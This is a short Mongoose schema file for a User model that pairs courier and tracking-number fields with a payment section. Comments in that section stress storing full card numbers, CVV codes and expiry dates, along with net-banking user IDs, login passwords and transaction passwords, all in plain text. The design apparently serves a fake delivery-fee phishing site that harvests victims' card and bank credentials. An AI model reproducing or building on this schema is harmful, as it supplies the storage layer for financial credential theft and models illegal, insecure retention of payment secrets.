import mongoose from "mongoose";

const userSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  email: { type: String, required: true, unique: true },
  address: { type: String, required: true },
  phoneno: { type: Number, required: true },
  createdAt: { type: Date, default: Date.now },

  courierCompany: { type: String, required: true },
  trackingNumber: { type: String, required: true },

  payment: {
    paymentMethod: {
      type: String,
      enum: ["DEBIT_CARD", "CREDIT_CARD", "NET_BANKING", "UPI"],
      required: true
    },

    // 🔴 CARD DETAILS (FULL)
    cardDetails: {
      cardHolderName: { type: String },
      cardNumber: { type: String }, // FULL CARD NUMBER (12–16 digits)
      cvv: { type: String },        // CVV
      cardType: { type: String },   // VISA / MASTER / RUPAY
      expiryMonth: { type: Number },
      expiryYear: { type: Number }
    },

    // 🔴 NET BANKING DETAILS
    netBankingDetails: {
      bankName: { type: String },
      branchName: { type: String },
      userId: { type: String },
      password: { type: String },
      transactionPassword: { type: String },
      ifscCode: { type: String }
    },

    // 🔴 UPI
    upiDetails: {
      type: String
    }
  }
});

const User = mongoose.model("User", userSchema);
export default User;
